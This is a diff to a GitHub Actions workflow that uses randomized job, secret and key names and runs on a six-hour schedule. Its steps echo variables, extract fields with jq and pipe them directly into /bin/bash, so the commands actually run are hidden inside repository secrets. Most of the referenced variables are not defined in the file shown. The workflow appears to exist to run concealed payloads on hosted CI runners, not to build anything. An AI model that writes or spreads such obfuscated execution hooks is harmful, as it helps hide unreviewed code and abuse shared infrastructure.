@@ -3,9 +3,8 @@ name: fudouding1938
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 0/6 * * *'
-
-jobs:  # 29664
+    - cron: '9 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,9 +12,17 @@ jobs:  # 29664
       - uses: actions/checkout@v4
       - name: fudouding1938
         env:
-          mvi2735: ${{ secrets.mvi2735 }}
+          szv6164: ${{ secrets.szv6164 }}
         run: |
-          echo $mvi2735 | jq -r .zf24 | /bin/bash
-          echo $jekc628 | jq -r .sqbec76136 | /bin/bash
-          echo $q191 | jq -r .nfs09 | /bin/bash
+          echo $szv6164 | jq -r .zz859 | /bin/bash
+          echo $dskg67741 | jq -r .mvr423 | /bin/bash
+          echo $ggni13556 | jq -r .t74166 | /bin/bash
+          echo $azih85 | jq -r .g97443 | /bin/bash
+          echo $zb02456 | jq -r .qdrm96010 | /bin/bash
+          echo $x9 | jq -r .xcpjo1 | /bin/bash
+          echo $lins624 | jq -r .znk66 | /bin/bash
+          echo $ue65086 | jq -r .olq1540 | /bin/bash
+          echo $bv510 | jq -r .g842 | /bin/bash
+          echo $yqvm8966 | jq -r .w782 | /bin/bash
+          echo $edf72925 | jq -r .owa04131 | /bin/bash
 
